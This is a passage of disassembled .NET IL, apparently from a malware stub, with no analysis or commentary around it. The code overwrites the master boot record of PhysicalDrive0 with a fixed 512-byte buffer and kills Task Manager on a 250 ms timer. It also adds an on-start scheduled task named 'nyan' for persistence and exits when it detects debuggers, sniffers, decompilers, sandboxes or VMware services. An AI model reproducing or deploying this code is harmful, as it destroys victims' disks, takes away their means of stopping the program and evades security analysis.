      IL_003e:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Close()
      IL_0043:  endfinally
    }  // end handler
    IL_0044:  ret
  } // end of method frmSustos::frmSustos_Load

  .property instance class [System.Windows.Forms]System.Windows.Forms.PictureBox
          PictureBox1()
  {
    .get instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
    .set instance void frmSustos::set_PictureBox1(class [System.Windows.Forms]System.Windows.Forms.PictureBox)
  } // end of property frmSustos::PictureBox1
} // end of class frmSustos

.class public auto ansi Stub.MBRSlayer
       extends [mscorlib]System.Object
{
  .field private static literal uint32 GenericWrite = uint32(0x40000000)
  .field private static literal uint32 GenericExecute = uint32(0x20000000)
  .field private static literal uint32 GenericAll = uint32(0x10000000)
  .field private static literal uint32 FileShareRead = uint32(0x00000001)
  .field private static literal uint32 FileShareWrite = uint32(0x00000002)
  .field private static literal uint32 OpenExisting = uint32(0x00000003)
  .field private static literal uint32 FileFlagDeleteOnClose = uint32(0x40000000)
  .field private static literal uint32 MbrSize = uint32(0x00000200)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MBRSlayer::.ctor

  .method public static pinvokeimpl("kernel32" winapi) 
          native int  CreateFile(string lpFileName,
                                 uint32 dwDesiredAccess,
                                 uint32 dwShareMode,
                                 native int lpSecurityAttributes,
                                 uint32 dwCreationDisposition,
                                 uint32 dwFlagsAndAttributes,
                                 native int hTemplateFile) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" winapi) 
          bool  WriteFile(native int hfile,
                          uint8[] lpBuffer,
                          uint32 nNumberOfBytesToWrite,
                          [out] uint32& lpNumberBytesWritten,
                          native int lpOverlapped) cil managed preservesig
  {
  }
  .method public static void  Start() cil managed
  {
    // Code size       234 (0xea)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             object V_4,
             uint32 V_5,
             native int V_6)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldc.i4     0x200
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  dup
      IL_0014:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '<PrivateImplementationDetails>'::F4302D72A369C8BADBF2BE9C2854DF4529637155
      IL_0019:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.3
      IL_0020:  stloc.2
      IL_0021:  ldstr      "\\\\.\\PhysicalDrive0"
      IL_0026:  ldc.i4     0x10000000
      IL_002b:  ldc.i4.3
      IL_002c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0031:  ldc.i4.3
      IL_0032:  ldc.i4.0
      IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0038:  call       native int Stub.MBRSlayer::CreateFile(string,
                                                                 uint32,
                                                                 uint32,
                                                                 native int,
                                                                 uint32,
                                                                 uint32,
                                                                 native int)
      IL_003d:  box        [mscorlib]System.IntPtr
      IL_0042:  stloc.s    V_4
      IL_0044:  ldc.i4.4
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.s    V_5
      IL_0049:  ldc.i4.5
      IL_004a:  stloc.2
      IL_004b:  ldloc.s    V_4
      IL_004d:  dup
      IL_004e:  brtrue.s   IL_005d

      IL_0050:  pop
      IL_0051:  ldloca.s   V_6
      IL_0053:  initobj    [mscorlib]System.IntPtr
      IL_0059:  ldloc.s    V_6
      IL_005b:  br.s       IL_0062

      IL_005d:  unbox.any  [mscorlib]System.IntPtr
      IL_0062:  ldloc.3
      IL_0063:  castclass  uint8[]
      IL_0068:  ldc.i4     0x200
      IL_006d:  ldloca.s   V_5
      IL_006f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0074:  call       bool Stub.MBRSlayer::WriteFile(native int,
                                                          uint8[],
                                                          uint32,
                                                          uint32&,
                                                          native int)
      IL_0079:  pop
      IL_007a:  leave.s    IL_00e1

      IL_007c:  ldloc.1
      IL_007d:  ldc.i4.1
      IL_007e:  add
      IL_007f:  ldc.i4.0
      IL_0080:  stloc.1
      IL_0081:  switch     ( 
                            IL_00a2,
                            IL_0000,
                            IL_0007,
                            IL_001f,
                            IL_0044,
                            IL_0049,
                            IL_007a)
      IL_00a2:  leave.s    IL_00d6

      IL_00a4:  ldloc.2
      IL_00a5:  stloc.1
      IL_00a6:  ldloc.0
      IL_00a7:  switch     ( 
                            IL_00b4,
                            IL_007c)
      IL_00b4:  leave.s    IL_00d6

    }  // end .try
    filter
    {
      IL_00b6:  isinst     [mscorlib]System.Exception
      IL_00bb:  ldnull
      IL_00bc:  cgt.un
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  cgt.un
      IL_00c2:  and
      IL_00c3:  ldloc.1
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  and
      IL_00c8:  endfilter
    }  // end filter
    {  // handler
      IL_00ca:  castclass  [mscorlib]System.Exception
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  leave.s    IL_00a4

    }  // end handler
    IL_00d6:  ldc.i4     0x800a0033
    IL_00db:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00e0:  throw

    IL_00e1:  ldloc.1
    IL_00e2:  brfalse.s  IL_00e9

    IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00e9:  ret
  } // end of method MBRSlayer::Start

} // end of class Stub.MBRSlayer

.class public auto ansi Stub.NoTsk
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTsk::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method NoTsk::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTsk::Start

} // end of class Stub.NoTsk

.class public auto ansi Stub.NoTska
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTska::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldsfld     string j.OK::NTTA
    IL_0005:  ldstr      "on"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  brtrue.s   IL_0045

    IL_0012:  ldstr      "taskmgr"
    IL_0017:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_001c:  stloc.1
    IL_001d:  ldc.i4.0
    IL_001e:  stloc.2
    IL_001f:  br.s       IL_003f

    IL_0021:  ldloc.1
    IL_0022:  ldloc.2
    IL_0023:  ldelem.ref
    IL_0024:  stloc.0
    .try
    {
      IL_0025:  ldloc.0
      IL_0026:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_002b:  leave.s    IL_003b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002d:  dup
      IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0033:  stloc.3
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  leave.s    IL_003b

    }  // end handler
    IL_003b:  ldloc.2
    IL_003c:  ldc.i4.1
    IL_003d:  add.ovf
    IL_003e:  stloc.2
    IL_003f:  ldloc.2
    IL_0040:  ldloc.1
    IL_0041:  ldlen
    IL_0042:  conv.i4
    IL_0043:  blt.s      IL_0021

    IL_0045:  ret
  } // end of method NoTska::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTska::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTska::Start

} // end of class Stub.NoTska

.class private auto ansi sealed Persistence
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Startup() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  4
    .locals init (object V_0)
    IL_0000:  ldsfld     string j.OK::DR
    IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_000a:  ldstr      "\\"
    IL_000f:  ldsfld     string j.OK::EXE
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0019:  stloc.0
    IL_001a:  ldstr      "schtasks /create /sc onstart /mo 1 /tn nyan /tr "
    IL_001f:  ldloc.0
    IL_0020:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0025:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_002a:  ldc.i4.0
    IL_002b:  ldc.i4.0
    IL_002c:  ldc.i4.m1
    IL_002d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0032:  pop
    IL_0033:  ret
  } // end of method Persistence::Startup

} // end of class Persistence

.class public auto ansi beforefieldinit MyAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
    IL_0005:  stsfld     class j.OK MyAntiProcess::N
    IL_000a:  ret
  } // end of method MyAntiProcess::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MyAntiProcess::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed noinlining nooptimization
  {
    // Code size       741 (0x2e5)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             int32 V_1,
             class [System]System.Diagnostics.Process[] V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process[] V_4,
             int32 V_5,
             class [System]System.Diagnostics.Process[] V_6,
             int32 V_7,
             class [System]System.Diagnostics.Process[] V_8,
             int32 V_9,
             class [System]System.Diagnostics.Process[] V_10,
             int32 V_11,
             class [System]System.Diagnostics.Process[] V_12,
             int32 V_13,
             class [System]System.Diagnostics.Process[] V_14,
             int32 V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [System]System.Diagnostics.Process[] V_18,
             int32 V_19,
             class [System]System.Diagnostics.Process[] V_20,
             int32 V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [System]System.Diagnostics.Process[] V_24,
             int32 V_25,
             class [System]System.Diagnostics.Process[] V_26,
             int32 V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [System]System.Diagnostics.Process[] V_30,
             int32 V_31,
             class [System]System.Diagnostics.Process[] V_32,
             int32 V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35)
    IL_0000:  ldstr      "procexp"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_001c

    IL_000f:  ldloc.0
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  pop
    IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0018:  ldloc.1
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldlen
    IL_001f:  conv.i4
    IL_0020:  blt.s      IL_000f

    IL_0022:  ldstr      "SbieCtrl"
    IL_0027:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_002c:  stloc.2
    IL_002d:  ldc.i4.0
    IL_002e:  stloc.3
    IL_002f:  br.s       IL_003e

    IL_0031:  ldloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldelem.ref
    IL_0034:  pop
    IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_003a:  ldloc.3
    IL_003b:  ldc.i4.1
    IL_003c:  add.ovf
    IL_003d:  stloc.3
    IL_003e:  ldloc.3
    IL_003f:  ldloc.2
    IL_0040:  ldlen
    IL_0041:  conv.i4
    IL_0042:  blt.s      IL_0031

    IL_0044:  ldstr      "SpyTheSpy"
    IL_0049:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_004e:  stloc.s    V_4
    IL_0050:  ldc.i4.0
    IL_0051:  stloc.s    V_5
    IL_0053:  br.s       IL_0066

    IL_0055:  ldloc.s    V_4
    IL_0057:  ldloc.s    V_5
    IL_0059:  ldelem.ref
    IL_005a:  pop
    IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0060:  ldloc.s    V_5
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.s    V_5
    IL_0066:  ldloc.s    V_5
    IL_0068:  ldloc.s    V_4
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0055

    IL_006e:  ldstr      "wireshark"
    IL_0073:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0078:  stloc.s    V_6
    IL_007a:  ldc.i4.0
    IL_007b:  stloc.s    V_7
    IL_007d:  br.s       IL_0090

    IL_007f:  ldloc.s    V_6
    IL_0081:  ldloc.s    V_7
    IL_0083:  ldelem.ref
    IL_0084:  pop
    IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_008a:  ldloc.s    V_7
    IL_008c:  ldc.i4.1
    IL_008d:  add.ovf
    IL_008e:  stloc.s    V_7
    IL_0090:  ldloc.s    V_7
    IL_0092:  ldloc.s    V_6
    IL_0094:  ldlen
    IL_0095:  conv.i4
    IL_0096:  blt.s      IL_007f

    IL_0098:  ldstr      "apateDNS"
    IL_009d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a2:  stloc.s    V_8
    IL_00a4:  ldc.i4.0
    IL_00a5:  stloc.s    V_9
    IL_00a7:  br.s       IL_00ba

    IL_00a9:  ldloc.s    V_8
    IL_00ab:  ldloc.s    V_9
    IL_00ad:  ldelem.ref
    IL_00ae:  pop
    IL_00af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00b4:  ldloc.s    V_9
    IL_00b6:  ldc.i4.1
    IL_00b7:  add.ovf
    IL_00b8:  stloc.s    V_9
    IL_00ba:  ldloc.s    V_9
    IL_00bc:  ldloc.s    V_8
    IL_00be:  ldlen
    IL_00bf:  conv.i4
    IL_00c0:  blt.s      IL_00a9

    IL_00c2:  ldstr      "IPBlocker"
    IL_00c7:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00cc:  stloc.s    V_10
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.s    V_11
    IL_00d1:  br.s       IL_00e4

    IL_00d3:  ldloc.s    V_10
    IL_00d5:  ldloc.s    V_11
    IL_00d7:  ldelem.ref
    IL_00d8:  pop
    IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00de:  ldloc.s    V_11
    IL_00e0:  ldc.i4.1
    IL_00e1:  add.ovf
    IL_00e2:  stloc.s    V_11
    IL_00e4:  ldloc.s    V_11
    IL_00e6:  ldloc.s    V_10
    IL_00e8:  ldlen
    IL_00e9:  conv.i4
    IL_00ea:  blt.s      IL_00d3

    IL_00ec:  ldstr      "TiGeR-Firewall"
    IL_00f1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00f6:  stloc.s    V_12
    IL_00f8:  ldc.i4.0
    IL_00f9:  stloc.s    V_13
    IL_00fb:  br.s       IL_010e

    IL_00fd:  ldloc.s    V_12
    IL_00ff:  ldloc.s    V_13
    IL_0101:  ldelem.ref
    IL_0102:  pop
    IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0108:  ldloc.s    V_13
    IL_010a:  ldc.i4.1
    IL_010b:  add.ovf
    IL_010c:  stloc.s    V_13
    IL_010e:  ldloc.s    V_13
    IL_0110:  ldloc.s    V_12
    IL_0112:  ldlen
    IL_0113:  conv.i4
    IL_0114:  blt.s      IL_00fd

    IL_0116:  ldstr      "smsniff"
    IL_011b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0120:  stloc.s    V_14
    IL_0122:  ldc.i4.0
    IL_0123:  stloc.s    V_15
    IL_0125:  br.s       IL_0138

    IL_0127:  ldloc.s    V_14
    IL_0129:  ldloc.s    V_15
    IL_012b:  ldelem.ref
    IL_012c:  pop
    IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0132:  ldloc.s    V_15
    IL_0134:  ldc.i4.1
    IL_0135:  add.ovf
    IL_0136:  stloc.s    V_15
    IL_0138:  ldloc.s    V_15
    IL_013a:  ldloc.s    V_14
    IL_013c:  ldlen
    IL_013d:  conv.i4
    IL_013e:  blt.s      IL_0127

    IL_0140:  ldstr      "exeinfoPE"
    IL_0145:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014a:  stloc.s    V_16
    IL_014c:  ldc.i4.0
    IL_014d:  stloc.s    V_17
    IL_014f:  br.s       IL_0162

    IL_0151:  ldloc.s    V_16
    IL_0153:  ldloc.s    V_17
    IL_0155:  ldelem.ref
    IL_0156:  pop
    IL_0157:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_015c:  ldloc.s    V_17
    IL_015e:  ldc.i4.1
    IL_015f:  add.ovf
    IL_0160:  stloc.s    V_17
    IL_0162:  ldloc.s    V_17
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldlen
    IL_0167:  conv.i4
    IL_0168:  blt.s      IL_0151

    IL_016a:  ldstr      "NetSnifferCs"
    IL_016f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0174:  stloc.s    V_18
    IL_0176:  ldc.i4.0
    IL_0177:  stloc.s    V_19
    IL_0179:  br.s       IL_018c

    IL_017b:  ldloc.s    V_18
    IL_017d:  ldloc.s    V_19
    IL_017f:  ldelem.ref
    IL_0180:  pop
    IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0186:  ldloc.s    V_19
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_19
    IL_018c:  ldloc.s    V_19
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldlen
    IL_0191:  conv.i4
    IL_0192:  blt.s      IL_017b

    IL_0194:  ldstr      "Sandboxie Control"
    IL_0199:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019e:  stloc.s    V_20
    IL_01a0:  ldc.i4.0
    IL_01a1:  stloc.s    V_21
    IL_01a3:  br.s       IL_01b6

    IL_01a5:  ldloc.s    V_20
    IL_01a7:  ldloc.s    V_21
    IL_01a9:  ldelem.ref
    IL_01aa:  pop
    IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b0:  ldloc.s    V_21
    IL_01b2:  ldc.i4.1
    IL_01b3:  add.ovf
    IL_01b4:  stloc.s    V_21
    IL_01b6:  ldloc.s    V_21
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldlen
    IL_01bb:  conv.i4
    IL_01bc:  blt.s      IL_01a5

    IL_01be:  ldstr      "processhacker"
    IL_01c3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c8:  stloc.s    V_22
    IL_01ca:  ldc.i4.0
    IL_01cb:  stloc.s    V_23
    IL_01cd:  br.s       IL_01e0

    IL_01cf:  ldloc.s    V_22
    IL_01d1:  ldloc.s    V_23
    IL_01d3:  ldelem.ref
    IL_01d4:  pop
    IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01da:  ldloc.s    V_23
    IL_01dc:  ldc.i4.1
    IL_01dd:  add.ovf
    IL_01de:  stloc.s    V_23
    IL_01e0:  ldloc.s    V_23
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldlen
    IL_01e5:  conv.i4
    IL_01e6:  blt.s      IL_01cf

    IL_01e8:  ldstr      "dnSpy"
    IL_01ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f2:  stloc.s    V_24
    IL_01f4:  ldc.i4.0
    IL_01f5:  stloc.s    V_25
    IL_01f7:  br.s       IL_020a

    IL_01f9:  ldloc.s    V_24
    IL_01fb:  ldloc.s    V_25
    IL_01fd:  ldelem.ref
    IL_01fe:  pop
    IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0204:  ldloc.s    V_25
    IL_0206:  ldc.i4.1
    IL_0207:  add.ovf
    IL_0208:  stloc.s    V_25
    IL_020a:  ldloc.s    V_25
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldlen
    IL_020f:  conv.i4
    IL_0210:  blt.s      IL_01f9

    IL_0212:  ldstr      "CodeReflect"
    IL_0217:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021c:  stloc.s    V_26
    IL_021e:  ldc.i4.0
    IL_021f:  stloc.s    V_27
    IL_0221:  br.s       IL_0234

    IL_0223:  ldloc.s    V_26
    IL_0225:  ldloc.s    V_27
    IL_0227:  ldelem.ref
    IL_0228:  pop
    IL_0229:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_022e:  ldloc.s    V_27
    IL_0230:  ldc.i4.1
    IL_0231:  add.ovf
    IL_0232:  stloc.s    V_27
    IL_0234:  ldloc.s    V_27
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldlen
    IL_0239:  conv.i4
    IL_023a:  blt.s      IL_0223

    IL_023c:  ldstr      "Reflector"
    IL_0241:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0246:  stloc.s    V_28
    IL_0248:  ldc.i4.0
    IL_0249:  stloc.s    V_29
    IL_024b:  br.s       IL_025e

    IL_024d:  ldloc.s    V_28
    IL_024f:  ldloc.s    V_29
    IL_0251:  ldelem.ref
    IL_0252:  pop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  ldloc.s    V_29
    IL_025a:  ldc.i4.1
    IL_025b:  add.ovf
    IL_025c:  stloc.s    V_29
    IL_025e:  ldloc.s    V_29
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldlen
    IL_0263:  conv.i4
    IL_0264:  blt.s      IL_024d

    IL_0266:  ldstr      "ILSpy"
    IL_026b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0270:  stloc.s    V_30
    IL_0272:  ldc.i4.0
    IL_0273:  stloc.s    V_31
    IL_0275:  br.s       IL_0288

    IL_0277:  ldloc.s    V_30
    IL_0279:  ldloc.s    V_31
    IL_027b:  ldelem.ref
    IL_027c:  pop
    IL_027d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0282:  ldloc.s    V_31
    IL_0284:  ldc.i4.1
    IL_0285:  add.ovf
    IL_0286:  stloc.s    V_31
    IL_0288:  ldloc.s    V_31
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldlen
    IL_028d:  conv.i4
    IL_028e:  blt.s      IL_0277

    IL_0290:  ldstr      "VGAuthService"
    IL_0295:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029a:  stloc.s    V_32
    IL_029c:  ldc.i4.0
    IL_029d:  stloc.s    V_33
    IL_029f:  br.s       IL_02b2

    IL_02a1:  ldloc.s    V_32
    IL_02a3:  ldloc.s    V_33
    IL_02a5:  ldelem.ref
